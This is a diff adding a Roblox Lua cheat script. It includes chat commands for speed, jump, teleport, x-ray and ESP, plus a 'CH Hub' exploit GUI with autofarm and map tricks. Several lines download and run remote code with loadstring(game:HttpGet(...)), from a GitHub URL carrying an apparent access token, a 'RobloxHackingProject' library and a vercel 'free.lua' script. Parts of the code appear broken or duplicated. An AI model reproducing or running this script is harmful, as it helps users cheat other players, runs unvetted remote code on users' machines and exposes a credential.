@@ -1,0 +1,521 @@
+local Players = game:GetService("Players")
+
+local function viewPlayer(playerName)
+  -- Improved player matching using string patterns
+  local foundPlayers = {}
+  for _, player in pairs(Players:GetPlayers()) do
+    if string.lower(player.Name):find("^" .. string.lower(playerName) .. ".*") then -- Match beginning and any characters, case-insensitive
+      foundPlayers[#foundPlayers + 1] = player
+    end
+  end
+
+  if #foundPlayers == 0 then
+    print("Player not found: " .. playerName)
+  elseif #foundPlayers == 1 then
+    -- View the single matching player
+    local player = foundPlayers[1]
+    workspace.CurrentCamera.CameraSubject = player.Character
+    player.Character.Humanoid.CameraMode = Enum.CameraMode.LockFirstPerson -- (Optional)
+  else
+    -- Multiple players matched, prompt for disambiguation
+    local choices = {}
+    for i, player in ipairs(foundPlayers) do
+      choices[i] = player.Name
+    end
+    local selectedIndex = game:GetService("UserInputService"):PromptSelection({
+      Title = "Multiple players found!",
+      Description = "Select the player you want to view:",
+      Options = choices,
+    })
+    if selectedIndex then
+      local player = foundPlayers[selectedIndex]
+      workspace.CurrentCamera.CameraSubject = player.Character
+      player.Character.Humanoid.CameraMode = Enum.CameraMode.LockFirstPerson -- (Optional)
+    end
+  end
+end
+
+local function unviewPlayer()
+  workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character
+  if Players.LocalPlayer.Character then -- Check if local player's character exists
+    Players.LocalPlayer.Character.Humanoid.CameraMode = Enum.CameraMode.FreeExplore -- Reset camera mode (Optional)
+  end
+end
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
+  local message = messageData.Message
+  if string.sub(message, 1, 6) == "/view " then
+    local playerName = string.sub(message, 7)
+    viewPlayer(playerName)
+  elseif message == "/unview" then
+    unviewPlayer()
+  end
+end)
+
+-- ///////////////////////////////////// THE NEXT IS RESET CHARACTER
+
+-- Listen for new players
+game.Players.PlayerAdded:Connect(function(player)
+  -- Chat message listener for the new player
+  player.Chatted:Connect(function(message)
+    if message:lower() == "/re" then
+      player.Character:BreakJoints()
+    end
+  end)
+end)
+
+-- Check existing players at script start
+for _, player in pairs(game.Players:GetPlayers()) do
+  -- Chat message listener for existing players
+  player.Chatted:Connect(function(message)
+    if message:lower() == "/re" then
+      player.Character:BreakJoints()
+    end
+  end)
+end
+
+-- ///////////////////////////////////// THE NEXT IS WALKSPEED & JUMPPOWER
+
+game.Players.PlayerAdded:Connect(function(player)
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/speed" then
+      local speed = tonumber(parts[2])
+      if speed then
+        player.Character.Humanoid.WalkSpeed = speed
+      end
+    elseif parts[1]:lower() == "/unspeed" then
+      player.Character.Humanoid.WalkSpeed = 16
+    elseif parts[1]:lower() == "/jump" then
+      local jumppower = tonumber(parts[2])
+      if jumppower then
+        player.Character.Humanoid.JumpPower = jumppower
+      end
+    elseif parts[1]:lower() == "/unjump" then
+      player.Character.Humanoid.JumpPower = 50
+    end
+  end)
+end)
+
+for _, player in pairs(game.Players:GetPlayers()) do
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/speed" then
+      local speed = tonumber(parts[2])
+      if speed then
+        player.Character.Humanoid.WalkSpeed = speed
+      end
+    elseif parts[1]:lower() == "/unspeed" then
+      player.Character.Humanoid.WalkSpeed = 16
+    elseif parts[1]:lower() == "/jump" then
+      local jumppower = tonumber(parts[2])
+      if jumppower then
+        player.Character.Humanoid.JumpPower = jumppower
+      end
+    elseif parts[1]:lower() == "/unjump" then
+      player.Character.Humanoid.JumpPower = 50
+    end
+  end)
+end
+
+-- ///////////////////////////////////// THE NEXT IS ZOOM MAX
+
+game.Players.PlayerAdded:Connect(function(player)
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/zoom" then
+      local zoom = tonumber(parts[2])
+      if zoom then
+        player.CameraMaxZoomDistance = zoom
+      end
+    elseif parts[1]:lower() == "/unzoom" then
+      player.CameraMaxZoomDistance = 12
+    end
+  end)
+end)
+
+for _, player in pairs(game.Players:GetPlayers()) do
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/zoom" then
+      local zoom = tonumber(parts[2])
+      if zoom then
+        player.CameraMaxZoomDistance = zoom
+      end
+    elseif parts[1]:lower() == "/unzoom" then
+      player.CameraMaxZoomDistance = 12
+    end
+  end)
+end
+
+
+game.Players.PlayerAdded:Connect(function(player)
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/unzoom" then
+      player.CameraMaxZoomDistance = 12
+    end
+  end)
+end)
+
+-- ///////////////////////////////////// THE NEXT IS REMOVE TEXTURES & HIDE WORLD
+
+for _, player in pairs(game.Players:GetPlayers()) do
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/gfx" then
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/CKVHubs/Secret/main/GFX?token=GHSAT0AAAAAACT472YCOKN6KLEOCQSREFIKZTVKCKQ"))()
+    elseif parts[1]:lower() == "/afkmode" then
+      for _, part in pairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") then
+          part.Transparency = 1
+        end
+      end
+    elseif parts[1]:lower() == "/unafkmode" then
+      for _, part in pairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") then
+          part.Transparency = 0
+        end
+      end
+    end
+  end)
+end
+
+-- ///////////////////////////////////// THE NEXT IS TIME WORLD
+
+for _, player in pairs(game.Players:GetPlayers()) do
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/day" then
+      game.Lighting.ClockTime = 12
+    elseif parts[1]:lower() == "/night" then
+      game.Lighting.ClockTime = 18
+    elseif parts[1]:lower() == "/settime" and #parts >= 2 then
+      local time = tonumber(parts[2])
+      if time then
+        game.Lighting.ClockTime = time
+      end
+    end
+  end)
+end
+
+-- ///////////////////////////////////// THE NEXT IS ESP
+
+-- Import required libraries
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+-- Function to create the ESP
+local function createESP()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer then
+            -- Create the ESP box
+            local box = Instance.new("BoxHandleAdornment")
+            box.Name = player.Name .. "ESP"
+            box.Adornee = player.Character
+            box.AlwaysOnTop = true
+            box.ZIndex = 5
+            box.Size = Vector3.new(3, 6, 2)
+            box.Color3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+            box.Transparency = 0.5
+            box.Parent = player.Character
+
+            -- Create the name text
+            local nameText = Instance.new("BillboardGui")
+            nameText.Name = player.Name .. "NameText"
+            nameText.Adornee = player.Character.Head
+            nameText.Size = UDim2.new(1, 400, 1, 450)
+            nameText.AlwaysOnTop = true
+            local textLabel = Instance.new("TextLabel")
+            textLabel.Text = player.Name
+            textLabel.Size = UDim2.new(1, 0, 1, 0)
+            textLabel.BackgroundTransparency = 1
+            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            textLabel.Parent = nameText
+            nameText.Parent = player.Character
+        end
+    end
+end
+
+-- Function to update the ESP
+local function updateESP()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer then
+            local box = player.Character:FindFirstChild(player.Name .. "ESP")
+            local nameText = player.Character:FindFirstChild(player.Name .. "NameText")
+            if box then
+                box.Adornee = player.Character
+                box.Color3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+            end
+            if nameText then
+                nameText.Adornee = player.Character.Head
+            end
+        end
+    end
+end
+
+-- Function to delete the ESP
+local function deleteESP()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer then
+            local box = player.Character:FindFirstChild(player.Name .. "ESP")
+            local nameText = player.Character:FindFirstChild(player.Name .. "NameText")
+            if box then
+                box:Destroy()
+            end
+            if nameText then
+                nameText:Destroy()
+            end
+        end
+    end
+end
+
+-- Start the ESP when "/esp" is typed
+for _, player in pairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        local parts = message:split(" ")
+        if parts[1]:lower() == "/esp" then
+            createESP()
+            RunService.RenderStepped:Connect(updateESP)
+        end
+    end)
+end
+
+-- Delete the ESP when "/unesp" is typed
+for _, player in pairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        local parts = message:split(" ")
+        if parts[1]:lower() == "/unesp" then
+            deleteESP()
+        end
+    end)
+end
+
+-- ///////////////////////////////////// THE NEXT IS SAVE LOCATION
+
+local savedCFrame = nil
+local loopBackEnabled = false
+
+for _, player in pairs(game.Players:GetPlayers()) do
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/savetp" then
+      savedCFrame = player.Character.HumanoidRootPart.CFrame
+    elseif parts[1]:lower() == "/back" then
+      if savedCFrame then
+        player.Character.HumanoidRootPart.CFrame = savedCFrame
+      end
+    elseif parts[1]:lower() == "/loopback" then
+      loopBackEnabled = true
+      while loopBackEnabled do
+        if savedCFrame then
+          player.Character.HumanoidRootPart.CFrame = savedCFrame
+        end
+        wait(1) -- Adjust the wait time as needed
+      end
+    elseif parts[1]:lower() == "/unback" then
+      loopBackEnabled = false
+    end
+  end)
+end
+
+-- ///////////////////////////////////// THE NEXT IS TP TO PLAYERS
+
+local Players = game:GetService("Players")
+
+local function teleportToPlayer(playerName)
+  -- Improved player matching using string patterns
+  local foundPlayers = {}
+  for _, player in pairs(Players:GetPlayers()) do
+    if string.lower(player.Name):find("^" .. string.lower(playerName) .. ".*") then -- Match beginning and any characters, case-insensitive
+      table.insert(foundPlayers, player)
+    end
+  end
+
+  if #foundPlayers == 0 then
+    print("Player not found: " .. playerName)
+  elseif #foundPlayers == 1 then
+    -- Teleport to the single matching player
+    local player = foundPlayers[1]
+    Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+  else
+    -- Multiple players matched, prompt for disambiguation
+    local choices = {}
+    for i, player in ipairs(foundPlayers) do
+      choices[i] = player.Name
+    end
+    local selectedIndex = game:GetService("UserInputService"):PromptSelection({
+      Title = "Multiple players found!",
+      Description = "Select the player you want to teleport to:",
+      Options = choices,
+    })
+    if selectedIndex then
+      local player = foundPlayers[selectedIndex]
+      Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+    end
+  end
+end
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
+  local message = messageData.Message
+  if string.sub(message, 1, 4) == "/tp " then
+    local playerName = string.sub(message, 5)
+    teleportToPlayer(playerName)
+  end
+end)
+
+-- ///////////////////////////////////// THE NEXT IS X-RAY
+
+for _, player in pairs(game.Players:GetPlayers()) do
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/xray" then
+      for _, part in pairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") then
+          part.Transparency = 0.5
+        end
+      end
+    end
+  end)
+end
+
+-- ///////////////////////////////////// THE NEXT IS HIDE GUIS
+
+for _, player in pairs(game.Players:GetPlayers()) do
+  player.Chatted:Connect(function(message)
+    local parts = message:split(" ")
+    if parts[1]:lower() == "/hide ui" then
+      for _, gui in pairs(game:GetService("CoreGui"):GetChildren()) do
+        gui.Enabled = false
+      end
+    elseif parts[1]:lower() == "/unhide" then
+      for _, gui in pairs(game:GetService("CoreGui"):GetChildren()) do
+        gui.Enabled = true
+      end
+    end
+  end)
+end
+
+-- ///////////////////////////////////// THE NEXT IS CMDS
+
+game.StarterGui:SetCore("ChatMakeSystemMessage", {
+    Text = "hi",
+    Color = Color3.fromRGB(0, 255, 0)
+})    -----------
+local BlekLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/CHHub/main/lib/library.lua"))()
+
+--Locals
+local runService = game:GetService("RunService")
+
+--Keybind
+BlekLib:SetUIBind(Enum.KeyCode.F)
+
+local win = BlekLib:Create({
+    Name = "CH Hub",
+    StartupSound = {
+        Toggle = false,
+        SoundID = "rbxassetid://6958727243",
+        TimePosition = 1
+    }
+})
+
+--Tabs
+local exploittab = win:Tab('Exploits')
+local teleporttab = win:Tab('Teleports')
+local settings = win:Tab('Settings')
+local credits = win:Tab('Credits')
+
+
+--ExploitTab
+exploittab:Toggle('Walk On Water', function(bool)
+	local water = game.Workspace.WaterLevel
+	if not bool then 
+		water.CanCollide = false
+		water.Size = Vector3.new(10, 1, 10)
+	end
+	if bool then 
+		water.CanCollide = true
+		water.Size = Vector3.new(1000, 1, 1000)
+	end
+end)
+
+exploittab:Toggle('Solid Island', function(bool)
+	for _, v in pairs (game.workspace:GetDescendants())do
+		if v.Name == 'LowerRocks' then
+			v.CanCollide = bool
+		end
+	end
+end)
+
+exploittab:Toggle('Choose Map', function(bool)
+	game.Players.LocalPlayer.PlayerGui.MainGui.MapVotePage.Visible = bool
+end)
+
+exploittab:Toggle('Autofarm', function(bool)
+	if bool then
+		event = runService.RenderStepped:Connect(function()
+			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264, 195, 288)
+		end)
+	else
+		event:Disconnect()
+	end
+end)
+
+exploittab:Button('Launch Rocket', function()
+	pcall(function()
+		fireclickdetector(game:GetService("Workspace").Structure["Launch Land"]["SPACESHIP!!"].Shuttle.IgnitionButton.ClickDetector)
+		fireclickdetector(game:GetService("Workspace").Structure["Launch Land"].RocketStand.ConsoleLower.ReleaseButtonLower.ClickDetector)
+		fireclickdetector(game:GetService("Workspace").Structure["Launch Land"].RocketStand.ConsoleUpper.ReleaseButtonUpper.ClickDetector)
+		fireclickdetector(game:GetService("Workspace").Structure["Launch Land"].LoadingTower.Console.ReleaseEntryBridge.ClickDetector)
+	end)
+end)
+
+exploittab:Button('Say Current Disaster', function()
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(game.Players.LocalPlayer.Character.SurvivalTag.Value, "All")
+end)
+
+exploittab:Slider('WalkSpeed', 16, 16, 50, function(a)
+	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = a
+end)
+
+exploittab:Slider('Gravity', 196, 0, 196, function(a)
+	game.Workspace.Gravity = a
+end)
+
+exploittab:Button('Remove Sandstorm UI', function()
+	game.Players.LocalPlayer.PlayerGui.SandStormGui:destroy()
+end)
+
+exploittab:Button('Remove Blizzard UI', function()
+	game.Players.LocalPlayer.PlayerGui.BlizzardGui:destroy()
+end)
+
+exploittab:Button('Remove Ads', function()
+	game:GetService("Workspace").BillboardAd:Destroy()
+	game:GetService("Workspace")["Main Portal Template "]:Destroy()
+	game:GetService("Workspace").ReturnPortal:Destroy()
+end)
+
+
+--TeleportTab
+teleporttab:Button('Island', function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-108, 49, 0)
+end)
+
+teleporttab:Button('Tower', function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264, 196, 288)
+end)
+
+
+--Settings
+settings:Button('Destroy GUI', function()
+    win:Exit()
+end)    -------   ScriptKey = "blockburgnew"
+
+loadstring(game:HttpGet("https://vysorbloxburg.vercel.app/free.lua", true))()
+
+for _, part in pairs(workspace:GetDescendants()) do
+    if part:IsA("BasePart") then
+        part.Transparency = 1
+    end
+end
